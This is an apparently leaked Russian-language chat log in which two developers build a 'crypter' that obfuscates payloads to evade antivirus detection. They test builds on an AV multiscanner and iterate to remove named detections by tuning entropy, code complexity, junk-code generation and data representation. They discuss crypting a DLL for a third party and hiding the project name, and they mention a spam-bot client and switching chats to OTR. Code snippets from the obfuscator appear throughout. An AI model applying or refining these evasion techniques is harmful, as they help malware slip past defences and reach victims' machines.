[01.11.21 12:13:33] basil:		да
[01.11.21 12:13:34] elroy:		да врядли дело в нем
[01.11.21 12:13:43] elroy:		Хотя, конечно, может быть.
[01.11.21 12:13:56] elroy:		Но тогда скорее всего бы просто файл не собирался бы
[01.11.21 12:14:02] elroy:		Он собирается, но выпадает
[01.11.21 12:14:22] elroy:		И это странно. А без доработок он не падает. Знать бы где
[01.11.21 12:14:53] basil:		ну тогда получается , что где то теги неправильно поставлены. Похоже на это. Мне так кажется. Я могу в поиске помочь ?
[01.11.21 12:16:18] elroy:		Теги там правильно поставлены, не работала бы предыдущая версия
[01.11.21 12:17:03] basil:		хорошо. Все может быть. Как я могу помочь?
[01.11.21 12:17:36] basil:		может быть и обускатор как-то сбоит
[01.11.21 12:17:44] basil:		ничего исключить нельзя
[01.11.21 12:18:04] elroy:		Прям сейачс ни как, так как помог уже, сейчас значит буду глубже ковыряться, надеюсь найду причину. Но от тебя мне еще тест нужен под ллвм, как говорили в пятницу
[01.11.21 12:18:45] elroy:		И не на 3, а на 16 хотябы
[01.11.21 12:18:48] basil:		clang я вроде поставил
[01.11.21 12:19:01] basil:		ну 16 и устанавливал
[01.11.21 12:19:14] elroy:		Ок, проверни с клангом
[01.11.21 12:19:46] basil:		слушай, я совсем не хотел тебя подвести. Старался побысрее этот обфускатор сделать. Но у меня он работает
[01.11.21 12:20:00] basil:		По крайней мере с тем кодом что я высылал
[01.11.21 12:20:24] elroy:		Ок, пока я не могу сказать, что подвел, раз работает.
[01.11.21 12:20:25] basil:		вот сосвсем не хотел
[01.11.21 12:21:09] elroy:		Когда сам найду что дело в обфускаторе, тогда скажу)))
[01.11.21 12:21:14] elroy:		(шутка)
[01.11.21 12:21:31] basil:		хорошо. ок
[01.11.21 12:37:39] basil:		LLVM тоже работает
[01.11.21 12:39:01] elroy:		Это радует
[01.11.21 12:39:01] elroy:		Спасибо)
[01.11.21 12:39:22] basil:		ок
[01.11.21 15:04:30] basil:		тест
[01.11.21 15:05:04] basil:		там заказчик по спам-боту снова в отъезде. Поэтому если могу чем-то помочь - пиши
[01.11.21 15:20:16] elroy:		Можешь
[01.11.21 15:20:42] basil:		пиши
[01.11.21 15:21:57] elroy:		Засунь доработанный генератор в криптер в отдельную ветку, сделанную то коммита, который сейчас напишу. Интегрируй и протести  че там с детектами будет
[01.11.21 15:22:26] elroy:		В том числе и на работоспособность надо проверить
[01.11.21 15:22:50] basil:		хорошо
[01.11.21 15:27:00] basil:		про коммит напиши. какой
[01.11.21 15:28:12] elroy:		коммит
```
SolutionBuilder - changed step payload obfuscation to 120 in Represent UInt64
id 205c06ae872395271eac66f305058c380036604b
от 2021-09-09 14:55:20
```
[01.11.21 15:28:33] elroy:		Это коммит в ветке develop
[01.11.21 15:28:42] basil:		забрал
[01.11.21 15:29:44] elroy:		Потом свою новую ветку вливаешь у себя локально в какую-нить ветку, например в develop_payload_generic и гриптуешь. Интересно, уйдут ли детекты
[01.11.21 15:30:04] basil:		хорошо. ок
[03.11.21 14:04:36] elroy:		выключим е2е
[03.11.21 14:04:56] elroy:		И включим отр
[03.11.21 14:04:57] basil:		тест
[03.11.21 14:05:01] elroy:		тест ок
[03.11.21 14:05:04] basil:		да. хорошо
[03.11.21 14:05:15] basil:		сейчас скину утилиту
[03.11.21 14:07:39] basil:		q4cp$hCleiY69BK$I1dOHYrAWMR2KdGjGwbEydXw
[03.11.21 14:09:16] basil:		https://file.io/ov0zoSZou6yy
[03.11.21 14:09:54] elroy:		Спасибо.
Слушай, а поясни эту мысль пожалуйста
```
[13:58:23] <faster> можно и во Wrapper добавить код из текущего кода утилиты. 
[13:58:40] <faster> хорошо. 
```
Утилита состоит как раз из кода враппера... А что такое ObfuscateCode() ? Я надеюсь это не вызов утилиты?
[03.11.21 14:11:55] basil:		момент
[03.11.21 14:13:01] basil:		сейчас ветвь извлеку
[03.11.21 14:15:31] basil:		```
bool PeReader::ObfuscateCode()
{
	const size_t count = m_stub->CountFilesToObfuscate;
	 _StubFilesToObfuscate* pFiles = (_StubFilesToObfuscate*) m_stub->FilesToObfuscate;
	
	TCHAR curPath[MAX_PATH];
	GetCurrentDirectory(sizeof(curPath), curPath);
	string curPathStr = curPath;
	curPathStr += "\\";



#ifdef  _DEBUG
	curPathStr = curPathStr.substr(0, curPathStr.size()-1);
	string del = "SolutionBuilderProj";
	string::size_type pos = curPathStr.find(del);
	curPathStr.erase(pos, del.size());

#endif 

	
	
	for (size_t c = 0; c < count; c++)
	{

		std::string commLine = curPathStr + "\\noiser.exe";
		commLine = commLine	+ " --src_cpp_file " + curPathStr+ pFiles->SrcCppFile;
		commLine = commLine	+ " --dst_cpp_file " + curPathStr +  pFiles->DstCppFile;

		commLine = commLine + " --src_h_noise_tpl  " + curPathStr +  pFiles->TplSrcNoiseHFile;
		commLine = commLine + " --src_cpp_noise_tpl " + curPathStr + pFiles->TplSrcNoiseCppFile;

		commLine = commLine + " --dst_h_noise_file " + curPathStr +  pFiles->TplDstNoiseHFile;
		commLine = commLine + " --dst_cpp_noise_file  " + curPathStr  + pFiles->TplDstNoiseCppFile;

		commLine = commLine
			+ " --code-complexity "
			+ to_string(m_code_complexity.maxLocVar) + ","
			+ to_string(m_code_complexity.maxOper) + ","
			+ to_string(m_code_complexity.maxGenFunc) + ","
			+ to_string(m_code_complexity.maxDeep) + ","
			+ to_string(m_code_complexity.maxMainFuncOper)+","
			+ to_string(m_code_complexity.deepWrappe);


		if (system(commLine.c_str())) {
			printf("noiser.exe not can obfuscation code.\n");
			return false;
		}

		pFiles++;
	}

	return true;
}
```
[03.11.21 14:15:44] basil:		Есть такой вариант
[03.11.21 14:16:02] basil:		Т.е. именно вызов утилиты из командной строки
[03.11.21 14:17:56] basil:		Есть вариант, когда код утилиты встроен именно во в класс Wrapper. Т.е. я взял код из утилиты и перенес его во Wrapper, ReadyCodeObfuscator и другие классы, где в этом была необходимость
[03.11.21 14:18:08] basil:		Какой вариант оставим
[03.11.21 14:18:09] basil:		?
[03.11.21 14:20:48] elroy:		Вот только не обижайся, я не со злости)
Но каааак можно было такое придумать! )))
Вессь код встрой в классы Wrapper и другие. Сравни файлы (notepad++ и compare плагин) да перенси.
Просто утилита состояит почти полностью из кода Wrapper, ReadyCodeObfuscator и т.д. Я их просто с солюшнбилдера скопировал.
[03.11.21 14:22:00] elroy:		Я на память эту функцию сохраню)))
[03.11.21 14:24:02] basil:		ладно. Я просто не понял. Вчера вроде именно первый вариант ты и сказал сделать. Мне это тоже паказалось странным. Но спорить не стал. А так во Wrapper я код изначально встроил. В отдельной ветке от есть. Я его на всякий случай сохранил. Я просто спорить не стал
[03.11.21 14:24:28] basil:		сейчас закину. Другую ветку
[03.11.21 14:26:33] elroy:		Хорошо)))
[03.11.21 14:39:21] elroy:		А в чем исправление заключалось?
[03.11.21 14:39:39] basil:		сейчас погоди
[03.11.21 14:39:45] basil:		3 мин
[03.11.21 14:42:07] basil:		что-то не то....
[03.11.21 14:42:14] basil:		У меня происходит
[03.11.21 14:42:20] basil:		Прошу пардона
[03.11.21 14:42:33] elroy:		ок
[03.11.21 14:42:44] basil:		дай я еще чуть посижу не понимаю. Что происходит
[03.11.21 14:42:55] elroy:		хорошо
[03.11.21 15:03:08] basil:		Ох... Слушай хотел как лучше
[03.11.21 15:03:17] basil:		Но тут странные дела творятся.
[03.11.21 15:03:39] basil:		Вот есть 2 ветки
[03.11.21 15:03:50] basil:		develop_obfuscation_with_noiser.exe
develop_obfuscation_with_utility
[03.11.21 15:05:47] basil:		в первой идет "странное" использование утилиты. Во второй я перенес код Wrapper в криптер. Проверка на dyncheck дает чистый результат для develop_obfuscation_with_noiser.exe и грязный для develop_obfuscation_with_utility
[03.11.21 15:05:56] basil:		Ну что за ересь
[03.11.21 15:06:54] basil:		Может как-то 2  Wrapper сделать?
[03.11.21 15:07:01] basil:		Что-то я совсем запутался
[03.11.21 15:07:31] basil:		Или пока использовать вот этот "странный" вариант?
[03.11.21 15:07:58] basil:		Я ничего понять не могу
[03.11.21 15:08:11] elroy:		Попробуй поэкспериментировать с генератором случайных чисел, очень пахнет неслучайной генерацией.
[03.11.21 15:08:24] elroy:		Если вызвать утилиту, код будет другой по идее
[03.11.21 15:08:39] elroy:		Т.е. там будут другие значения случайного генератора
[03.11.21 15:08:56] elroy:		А вообще интересно. Я и сам гляну чуть позже
[03.11.21 15:08:57] basil:		Кстати да.
[03.11.21 15:12:41] elroy:		Может еще давать детект общий паттерн структуры кода. В одном случае оборачивается код двояко, то о чем ты спрашивал с начала разговора (обворачивание шумового экспорта в длл). В другом же все как по шаблону
[03.11.21 15:13:39] elroy:		И как еще вариант, ты можешь видеть один код, в студии, а собирать другой. Так иногда студия и гит шутят
[03.11.21 15:14:05] basil:		интересные у них шуточки
[03.11.21 15:14:23] basil:		Хорошо. сейчас отойду 10 мин. В магаз
[03.11.21 15:15:07] elroy:		ок
[03.11.21 15:38:47] basil:		на месте
[03.11.21 15:38:55] basil:		вот пока ходил.
[03.11.21 15:39:05] basil:		Про второй вариант думал
[03.11.21 15:40:23] basil:		Я предлагаю сейчас мне сдалать какую-ниюудь переключалку. Которая будет переключать паттерны. Проверим. может это что-то даст
[03.11.21 15:41:10] elroy:		Хорошо, добавь параметр --use-external-obfuscator yes в параметры билдсистемы
[04.11.21 08:25:38] basil:		Тест
[04.11.21 08:25:45] elroy:		тест ок
[04.11.21 08:25:52] basil:		Вот отлично
[04.11.21 08:27:19] elroy:		Насчет вчерашней задачки. Просмотри как добавдены параметры в билдсистеме, вот тот параметры --use-external-obfuscator, надо получать от него не yes, а путь к обфускатору.
[04.11.21 08:27:29] elroy:		Но пути у нас без пробелов
[04.11.21 08:27:42] elroy:		С пробелам не поддерживаются
[04.11.21 08:30:40] basil:		Я сейчас пытаюсб все таки нормально сделать "по-человечески". Если детекты все таки останутся  - тогда введу этот параметр "--use-external-obfuscator"
[04.11.21 08:31:47] elroy:		А ситуацию много раз проверил?
[04.11.21 08:31:53] elroy:		Может случайность?
[04.11.21 08:33:18] basil:		ну могу сейчас еще раз проверить конечно. Там даже размер очень отличается где-то 530 кб против 900кб. Бинарники работчие -проверял
[04.11.21 08:34:22] elroy:		Проверь еще раз и размер бинарников
[04.11.21 08:34:44] basil:		С другой стороны не сделал бы этот извар - не узнали бы что детекты так можно побороть
[04.11.21 08:35:06] basil:		Не было счастья - да несчастье помогло
[04.11.21 08:35:23] elroy:		Там вопрос в том, что не то скорее всего оборачивается. Или оборачивается вдвойне
[04.11.21 08:35:46] elroy:		А детекты можно побороть и изменениями параметров complexity
[04.11.21 08:35:58] basil:		Да?
[04.11.21 08:35:59] elroy:		Помогает не всегда, но помогает
[04.11.21 08:36:06] elroy:		Поэтому это тметод и используем
[04.11.21 08:36:24] basil:		Ну ладно сейчас еще несколько раз прогоню
[04.11.21 08:48:37] basil:		https://dyncheck.com/scan/id/cc5e25fc98d1a5bb3af74b6179a5900c
[04.11.21 08:49:10] basil:		https://dyncheck.com/scan/id/cd5bef65e9c7ad0730cf857af6cb16db
[04.11.21 08:49:45] basil:		с утилитой где-то 980кб, без 570 кб
[04.11.21 08:51:10] elroy:		А для обоих случаев одинаковые complexity ?
[04.11.21 08:51:35] elroy:		Не оборачивается файл дважды, утилитой и внутренним
[04.11.21 08:53:41] basil:		Да нет. Получается что утилитой оборачивается только UniCrypter.cpp , а классом Wrapper payload.cpp
[04.11.21 08:56:53] basil:		я вот думаю. У меня такое мнение , что именно разные шаблоны присутсвуют в коде с вложенными условими и без влложенных условий
[04.11.21 08:59:48] elroy:		Размер сильно отличается
[04.11.21 09:00:24] basil:		думаешь несколько раз там было оборачивание?
[04.11.21 09:01:53] elroy:		Не знаю, но это признак либо большого complexity, либо был двойной проход. А что может вызвать такой рост еще?
[04.11.21 09:02:55] basil:		да логично
[04.11.21 09:03:32] basil:		хорошо. сейчас попробую diff-ом проверить
[04.11.21 09:05:04] elroy:		Была ситуация, на которую мы закрыли глаза раньше, еще в начальных версиях криптера.
Мы генерировали файлы с окончанием \n и \r\n вперемешку в одном файле. Так вот, когда менял на что-то одно (на \r\n), менялся детект. Это скорее как баг компилятора чтоли
[04.11.21 09:05:57] basil:		У меня сейчас волосы стали дыбом))))
[04.11.21 09:06:12] basil:		Нифига себе тонкости.....
[04.11.21 09:08:37] elroy:		Там еще похожее попадалось в зависимости от наличия коментарив в файле.
Там были #define блоки закомментированные. Так вот, если блок закоментированный был - был детект, если не был вообще - детекта небыло. По сути, закоментированный #define все одно, что его нет. Но где-то в компиляторе на что-то влияло
[04.11.21 09:09:21] elroy:		Можешь попробовать еще эсперимент с 2022 студией, там могли баг поправить (и добавить новые).
[04.11.21 09:09:29] elroy:		С 2022 там есть ветка, если помнишь
[04.11.21 09:09:38] elroy:		Надо грамотно смешать (слить) эти ветки
[04.11.21 09:09:52] elroy:		ЛОКАЛЬНО
[04.11.21 09:10:44] basil:		хорошо. сейчас попробую
[04.11.21 09:15:16] elroy:		Глянь еще энтропию обоих файлов, это можно сделать из консоли, просто build --check-entropy yes --payload c:\...
Как-то так
[04.11.21 09:15:35] basil:		энтропия там примерно одинакова
[04.11.21 09:15:44] basil:		в консоли посмотрел
[04.11.21 09:15:57] elroy:		Там просто в файле с детектами детект Heur.AdvML.B, он возникает при высокой энтропии
[04.11.21 09:16:11] elroy:		Обычно 7+
[04.11.21 09:18:39] basil:		в среднем 
text 6.7
rdata 6.7
[04.11.21 09:19:05] basil:		а вот data отличается
[04.11.21 09:19:41] basil:		без утилиты 2,7 с утилитой 3,1
[04.11.21 09:20:12] basil:		может ее принудительно установить
[04.11.21 09:20:17] elroy:		Ну сбей искуственно детект до 2.7, получится?
[04.11.21 09:20:22] elroy:		Да)
[04.11.21 09:20:29] basil:		хорошо
[04.11.21 09:20:32] basil:		сейчас
[04.11.21 09:33:02] basil:		так же устанавливается --entropy-data 3 ?
[04.11.21 09:33:24] elroy:		3.0
[04.11.21 09:34:17] basil:		info: failed to replace export self name
Так и должно быть?
[04.11.21 09:34:40] elroy:		Это инфо
[04.11.21 09:34:44] elroy:		Это не страшно
[04.11.21 09:34:50] elroy:		А в обоих случаях так?
[04.11.21 09:35:21] basil:		не понял. перефразируй
[04.11.21 09:35:50] elroy:		Эта информация показывается для билдов с внешней утилитой и без ?
[04.11.21 09:36:19] basil:		это показывется когда я пытаюсь установить принудительно энтропию
[04.11.21 09:36:30] elroy:		Это для dll билдов патчится имя библиотеки на мусор, чтобы в работу не светить слово crypter (имя проекта)
[04.11.21 09:36:43] elroy:		А в другом случае не показывается?
[04.11.21 09:36:49] basil:		нет
[04.11.21 09:36:54] basil:		такого не было
[04.11.21 09:37:21] basil:		но почему-то энтропия не меняетиься
[04.11.21 09:37:32] elroy:		Ну это интересно. На выходе dll ?
[04.11.21 09:38:15] basil:		нет. exe - запустить можно
[04.11.21 09:39:32] elroy:		И правда инетресно. Посмотри по коду, там это сообщение показывается тогда, когда файл открывается для патча и в нем не удается найти и заменить слвоо UniCrypter.dll.
[04.11.21 09:39:48] elroy:		Почему оно не показывается в первом случае не менее инетресно
[04.11.21 09:39:55] basil:		хорошо
[04.11.21 09:39:58] elroy:		Ведь в первом случае удается
[04.11.21 09:40:04] elroy:		Наверное
[04.11.21 10:25:06] basil:		вопрос
[04.11.21 10:25:09] basil:		std::string DllExp = (m_stub->ProjectName + 1) + std::string(".dll");
[04.11.21 10:25:45] basil:		вот это 
```
(m_stub->ProjectName + 1) 
```
[04.11.21 10:26:01] basil:		корректно?
[04.11.21 10:26:07] elroy:		Да
[04.11.21 10:26:19] elroy:		Это второй символ
[04.11.21 10:27:03] basil:		niCrypter.dll получается
[04.11.21 10:27:13] basil:		не UniCrypter.dll
[04.11.21 10:27:25] elroy:		Да. Похоже на то.
[04.11.21 10:29:11] elroy:		Там тонкость в поиске. Функция поиска ищет стрку не с начала, а эта конструкция используется для удовлетворения работы той функци. По идее удалена будет строка UniCrypter.dll
Это по памяти, более точно надо код смотреть. Но этот код правильным был...
[04.11.21 10:29:54] basil:		ок
[04.11.21 10:33:22] basil:		Хорошо. Я думаю все получится. Все равно детекты эти я УНИЧТОЖУ
[04.11.21 10:33:45] elroy:		ок))
[04.11.21 10:34:31] elroy:		Я написал генератор новых условий для условных переходов
[04.11.21 10:34:42] elroy:		Смотрю куда встроить...
[04.11.21 10:39:29] basil:		Это хорошая новость)))
[04.11.21 10:42:45] basil:		Сразу не смог ответить , глубоко в отладке
[04.11.21 10:54:02] basil:		нет. энтропия не влияет на детект.
[04.11.21 10:54:04] basil:		что -то другое
[04.11.21 11:10:51] elroy:		Меня беспокоит размер
[04.11.21 11:11:22] basil:		с какой позиции? просто размер большой?
[04.11.21 11:11:38] elroy:		Дак он не просто большой
[04.11.21 11:11:55] basil:		очень большой?
[04.11.21 11:11:58] basil:		слишком?
[04.11.21 11:12:13] elroy:		Я имею введу отличия.
[04.11.21 11:12:45] elroy:		При одинаковых complexity не должен отличаться уж на стлько
[04.11.21 11:13:19] elroy:		В криптере 3 параметра complexity, правильно проверял, т.е. нужный?
[04.11.21 11:13:42] elroy:		stub-complexity code-complexity pack-complexity
[04.11.21 11:13:55] basil:		в config.h да. Там одинаковые
[04.11.21 11:16:02] elroy:		Ну задай параметры --code-complexity из командной строки
[04.11.21 11:16:16] elroy:		Для сборки с внешним и с нутренним
[04.11.21 11:16:18] elroy:		Одинаковые
[04.11.21 11:17:04] basil:		хорошо. попробуем и так тоже
[04.11.21 11:32:45] basil:		нет --code-complexity  нового ничего не дало
[04.11.21 11:37:48] basil:		ладно. 40 мин перерыв. Может что-то еще в голову придет
[04.11.21 11:39:16] basil:		ну вот. Смотри
https://dyncheck.com/scan/id/3c3e2b955221e56c4b05672fcc6b12c0
[04.11.21 11:39:29] basil:		а закоментировал только nopWinApiFunc
[04.11.21 11:39:45] basil:		```
char* nopWinApiFunc[] =
{
	""
}
```
[04.11.21 11:40:12] basil:		и детект HEUR
[04.11.21 11:40:25] basil:		только . Это видимо энтропия
[04.11.21 11:45:21] elroy:		Не, еще же zudochka
[04.11.21 11:45:58] basil:		но HEUR это  же скорее всего энтропия
[04.11.21 11:46:00] elroy:		Кстати да, отличия в этом месте есть, у тебя нет тут функций в noiser, а в криптере они есть
[04.11.21 11:46:11] elroy:		Да, это энтропия обычно
[04.11.21 11:46:17] elroy:		Высокая
[04.11.21 11:46:32] elroy:		Можно в rdata скинуть до 5.7 например
[04.11.21 11:46:43] basil:		да. уже запустил
[04.11.21 11:47:39] elroy:		> ладно. 40 мин перерыв. 
Иди и правда мысли проветри))
[04.11.21 11:48:22] elroy:		Как там..: "Сделай глубоких вход..."
[04.11.21 11:48:27] basil:		https://dyncheck.com/scan/id/8145d0f3e03b5b49318aab7cdd828aeb
[04.11.21 11:48:30] basil:		вот !
[04.11.21 11:48:33] basil:		получше
[04.11.21 11:48:39] basil:		сбросил энтропию
[04.11.21 11:48:47] basil:		--entropy-max-rdata 5.7
[04.11.21 11:49:15] elroy:		Там нано откуда взялся. Он тоже не лучше.
[04.11.21 11:49:16] basil:		а NANO сейчас в моде? Всмысле его можно игнорировать
[04.11.21 11:49:31] elroy:		Игнорировать нельзя ничего
[04.11.21 11:49:34] elroy:		Я так понял
[04.11.21 11:49:40] basil:		ок
[04.11.21 12:34:03] basil:		остался, получается только NANO. Его попробую вручную почистить. Может что-то даст
[04.11.21 12:34:16] basil:		Точнее должно получится
[04.11.21 14:15:13] basil:		тест
[04.11.21 14:15:33] elroy:		А можешь сделать библиотеку профилем bk вот с применением внешнего обфускатора?
[04.11.21 14:16:23] basil:		не понял. Это  как?
[04.11.21 14:16:36] elroy:		Ну криптануть надо dll
[04.11.21 14:16:47] elroy:		Но чистую
[04.11.21 14:16:53] elroy:		С этим внешним обфускатором
[04.11.21 14:17:43] basil:		может влить это ветку локально. в ветку с bk и криптануть
[04.11.21 14:17:48] basil:		А какой файл?
[04.11.21 14:19:02] elroy:		Напиши nick он даст. Нужен чистый крипт. И ему нжуна строка в файле. Для полученяи строки открой готовый файл в IDA и там strings, оттуда скопируй самую длинную строку
[04.11.21 14:19:30] elroy:		При крипте не забуть про --gen-exports параметр
[04.11.21 14:19:58] basil:		хорошо. сейчас
[04.11.21 14:27:26] basil:		тест
[04.11.21 14:27:36] basil:		знаешь что такое "1 крипт с рандом-строкой"
[04.11.21 14:31:01] elroy:		Да, знаю)
[04.11.21 14:31:05] elroy:		Я же выше написал)
[04.11.21 14:31:21] elroy:		Ему случайная строка внутри готового крипта нужна
[04.11.21 14:31:41] elroy:		Посмотри IDA ой файл, строки, скопируй оттуда
[04.11.21 14:31:54] basil:		понял. ок
[04.11.21 14:39:19] basil:		5 мб
[04.11.21 14:40:06] elroy:		ого
[04.11.21 14:40:34] elroy:		Странно
[04.11.21 14:40:43] basil:		сейчас его еще надо проверить
[04.11.21 14:40:44] elroy:		Дело точно в обфускаторе?
[04.11.21 14:40:48] basil:		может грязный
[04.11.21 14:42:13] basil:		зато чисто
[04.11.21 14:42:15] basil:		https://dyncheck.com/scan/id/54d31f74c70cb2d91bd4d5c6f7e3faf7
[04.11.21 14:42:30] elroy:		5 мб много) лимит 1
[04.11.21 14:42:33] elroy:		Понять бы почему
[04.11.21 14:42:48] elroy:		А это не ветка с верхушки develop ?
[04.11.21 14:43:37] basil:		нет. я просто ветку с утилитой этой влил в ветку beta_bk
[04.11.21 14:43:54] basil:		локально разумеется
[04.11.21 14:46:19] elroy:		А ветка с утилитой растет из ветки develop
[04.11.21 14:46:24] elroy:		Вот тебе и ответ
[04.11.21 14:46:29] elroy:		*ответы
[04.11.21 14:46:55] basil:		да. согласен
[04.11.21 14:47:35] elroy:		Так правда, выяснили что за)
[04.11.21 14:48:12] elroy:		Сам же понял почему разнятся детекты и размер?
[04.11.21 14:50:02] basil:		вообще не понял. не понимаю почему так происходит. Я сегодня код вдоль и поперек излазил. Но так и не понял. Сейчас довел в результате разных итераций до детекта только под NANO AV. Пытаюсь его выличить . Борюсь пока исключительно с ним
[04.11.21 14:52:10] elroy:		Я же написал выше. Тогда поясню
Это как раз тот вариант, в верхушке develop, где ты подготовил все к выбросу CRT, и переписал представление данных. И стали гигантские размеры. Поэтому я последний раз писал коммит, с которого надо что-то делать.
У тебя сейча с две ветки, одна с того коммита, другая с верхушки develop. Так как данные в другом виде, детектов нет.. Размер больше, из-за другого представления данных.
[04.11.21 14:52:14] elroy:		Вот все ответы
[04.11.21 14:53:31] elroy:		Скачай программку Guitar, открой в не йпапку с гитом, она покажет состояние веток графиески, поймешь...
[04.11.21 14:54:07] basil:		разве я с верхушки develop взял?
[04.11.21 14:54:24] elroy:		guitar говорит да
[04.11.21 14:54:42] elroy:		И файл в 5 мб тоже об этом говорит)
[04.11.21 14:56:01] basil:		хорошо. хоть теперь буду знать
[04.11.21 15:00:25] basil:		тест
[04.11.21 15:01:16] basil:		спасибо. конечно и безусловно. Но у меня сегодня день прошел глупо - в метаниях каких-то
[05.11.21 12:30:42] basil:		Приветствую
[05.11.21 12:30:51] basil:		Вот хорошо
[05.11.21 12:31:16] elroy:		Продолжай)
[05.11.21 12:32:07] basil:		что случилось?
[05.11.21 12:32:32] basil:		всмысле "что-то случилось?"
[05.11.21 12:32:57] elroy:		"Вот хорошо". - что-тоже хотел?
[05.11.21 12:36:10] basil:		Да. нет. Я пока в процессе. Если интресуют последние известия - то вчера сделал nick этот крипт. Сначала вроде как не работал. Потом заработал, опять же, вроде как. Но конечно жаловались на размер крипта.  Сейчас пытаюсь превести хранение данных в секции text c char[] на unsigned long long []. Но на текущий момент кодогенерация работает через раз
[05.11.21 12:40:40] basil:		А "Вот хорошо" - это хорошо, что шифрование включилось
[05.11.21 12:46:01] elroy:		Вот я насчет кодогенерации и хотел поговорить
[05.11.21 12:46:24] basil:		Давай. )))
[05.11.21 12:46:45] elroy:		В Represent представлено 4 класса генерации, на 1 2 4 8 байт.
[05.11.21 12:47:08] elroy:		Там сложность лишь в одном, это поправить шаблон
[05.11.21 12:47:18] elroy:		Там ты поправил шаблон и сделал CharArray
[05.11.21 12:47:32] elroy:		Вот почти точно так же можно исправить еще 3
[05.11.21 12:47:38] elroy:		Верней, сделать на их основе
[05.11.21 12:48:16] basil:		ну я так и пытаюсь сделать
[05.11.21 12:50:15] elroy:		Есть в чем-то сложность? С байтами там все понятно, подсказать что-то?
[05.11.21 12:51:02] basil:		сейчас момент
[05.11.21 12:51:13] elroy:		Я уверен ты и сам разберешься рано или поздно, но если есть затык - то спроси, быстрее будет просто))
[05.11.21 12:52:17] basil:		Да. нет . все нормально. Сложного там особо ничего нет. Принцип действия прибора понятен))) Больше вот муторность какая-то только присутсвует
[05.11.21 12:53:06] basil:		тут маленькая ошибочка появилась - там какая-то небольшая сложность. По сути текучка, но приятного мало
[05.11.21 12:53:23] basil:		Все нормально сделаю. У меня фундаментальных вопрпосв нет
[05.11.21 12:53:44] elroy:		ок
[05.11.21 13:21:21] elroy:		там должно все легко заменться. Типы данных там формируются.
```
uiunt64* arr = f_alloc(...);
uind64 data;
...
arr[i] = data;
return (char*)arr;
[05.11.21 13:30:27] basil:		ну не мовсем
[05.11.21 13:30:35] basil:		не совсем
[05.11.21 13:31:46] elroy:		А в чем там отличия? (особенность)
[05.11.21 13:34:58] basil:		ну получается что в Represent передается произвольный размер данных, а итоговый буфер должен быть выравнен на на размер кратный размеру типу хранения данных. Плюс, как я понимаю что например в lon long порядок байт litle endian , а должен быть приямой порядок байт . Впринципе последняя проблема может быть решена с помощью digit=_byteswap_uint64(digit);
[05.11.21 13:35:07] basil:		ну не сложно это больше противно
[05.11.21 13:35:54] elroy:		Там эта проблема уже решалась
[05.11.21 13:36:04] elroy:		Там собирается b1 b2 и т.д.
[05.11.21 13:36:42] basil:		да. теперь заметил
[05.11.21 13:36:43] elroy:		Присмотрись внимательно. Там ведь только вектор поменять на массив и все))
[05.11.21 13:48:53] basil:		решена да. Но там stf::
[05.11.21 13:48:56] basil:		std::
[05.11.21 14:03:02] elroy:		Где именно там std ?
[05.11.21 14:03:21] elroy:		В самом генераторе - фиг с ним, а в коде там меняется без std
[05.11.21 14:04:06] basil:		Вот здесь
[05.11.21 14:04:13] basil:		```
ReprFunc_VectorUInt::ReprFunc_VectorUInt(PeReader* pPeReader) :
	Represent::Represent(pPeReader)
{
	static const char* header =
		"char* %s(size_t* size) {\r\n"
		"  unsigned int data;"
		" std::vector<char> ret;"
		" std::vector<unsigned int> vect;"
		" vect.reserve(1024*1024*4);"
		" %s \r\n"
		"  try {\r\n";
	static const char* data[] = {
		"    data = 0x%02.2hhx%02.2hhx%02.2hhx%02.2hhx; vect.push_back(data); \r\n"
	};
	static const char* footer =
		"  } catch(const std::bad_array_new_length &e) {  std::cout << %s << e.what(); } \r\n"
		"  *size=%d; \r\n"
		"  ret.resize(vect.size() * sizeof(unsigned int)); \r\n"
		"  f_memcpy(ret.data(), vect.data(), ret.size()); \r\n"
		"  return (char*)ret.data(); }\r\n";

	TplHeader = header;
	TplFooter = footer;
	TplDataArr = data;
	TplDataCount = sizeof(data) / sizeof(char*);
}
```
[05.11.21 14:04:23] basil:		```
 data = 0x%02.2hhx%02.2hhx%02.2hhx%02.2hhx; vect.push_back(data); \r\n"
```
[05.11.21 14:06:01] elroy:		```
0x%02.2hhx%02.2hhx%02.2hhx%02.2hhx;
```
Это std ?
[05.11.21 14:06:05] basil:		или я опять пытаюсь что-то этакое придумать
[05.11.21 14:06:17] basil:		пардон
[05.11.21 14:06:21] basil:		stl
[05.11.21 14:06:49] elroy:		Там будет data = 0x00112233...
[05.11.21 14:07:01] elroy:		Т.е. проценты останутся в генераторе
[05.11.21 14:07:12] elroy:		В билде будет data = <значение>
[05.11.21 14:07:44] elroy:		push_back
это типичный
arr[i++] = data
[05.11.21 14:07:57] basil:		да. точно
[05.11.21 14:08:19] basil:		не знаю. как то последнее время совсем не в ту степь думаю
[05.11.21 14:08:50] elroy:		думай в ту)
[05.11.21 14:10:52] basil:		ладно сейчас. Собирусь. Буду мужиком
[05.11.21 15:08:27] basil:		тест
[05.11.21 15:08:41] basil:		ну вот сдвинулось с места
[05.11.21 15:09:28] basil:		сейчас еще смешать данные надо
[05.11.21 15:10:49] elroy:		Если 3 сообщения только присылал - ок
[05.11.21 15:11:01] elroy:		А то реконнекты были
[05.11.21 15:11:18] basil:		да именно 3 и прислал
[08.11.21 11:13:18] basil:		Приветствую
[08.11.21 11:14:55] elroy:		Приветствую
[08.11.21 11:15:03] elroy:		Давай отр использовать
[08.11.21 11:15:07] elroy:		Меньше истории будет зранится
[08.11.21 11:15:21] basil:		Хорошо. Как будет удобнее
[08.11.21 11:16:00] basil:		Сделал все таки на выходных криптер. С новой формой хранения данных (в массивах, не vector)
[08.11.21 11:16:08] basil:		Чисто
[08.11.21 11:16:10] basil:		https://dyncheck.com/scan/id/3b518a7829e363810685a3f13d1b0d68
[08.11.21 11:16:21] basil:		Но от билда к билду может разниться
[08.11.21 11:16:36] elroy:		Чудесно) Посмотрю. Какая ветка?
[08.11.21 11:16:45] basil:		Но размер.....
[08.11.21 11:17:39] basil:		Даже при использовании unsigned __int64. При размере нагрузки в 11 кб разрастается по 380 кб
[08.11.21 11:17:58] basil:		ветка develop_obfuscation_with_utility
[08.11.21 11:18:09] elroy:		Почему не рос вектор?)
[08.11.21 11:18:29] elroy:		Там получается что, код собирался на этапе сборки?))
[08.11.21 11:18:44] basil:		я думаю потому что в массивах каждый раз приходится индекс ячейки использовать
[08.11.21 11:19:28] basil:		а при вектор. там один и тот же метод vector.push_back(data)
[08.11.21 11:19:57] elroy:		Сделай тогда
int i = 5;
arr[i++] = ...
[08.11.21 11:20:17] basil:		да. можно. Давай попробую
[08.11.21 11:20:38] elroy:		Еще
